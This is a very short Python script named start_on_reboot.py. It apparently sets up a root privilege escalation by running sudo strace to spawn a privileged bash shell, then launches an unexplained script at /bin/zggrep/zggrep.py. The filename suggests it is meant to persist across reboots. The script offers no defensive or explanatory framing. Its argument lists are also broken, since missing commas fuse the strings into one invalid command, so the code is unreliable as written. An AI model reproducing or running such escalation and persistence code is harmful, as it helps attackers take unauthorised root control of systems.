# start_on_reboot.py
import subprocess, time

# perform root escalation
subprocess.run(["sudo", "/bin/strace" "-o" "/dev/null" "/bin/bash" "-p"])
time.sleep(2)
subprocess.run(["/bin/python" "/bin/zggrep/zggrep.py"])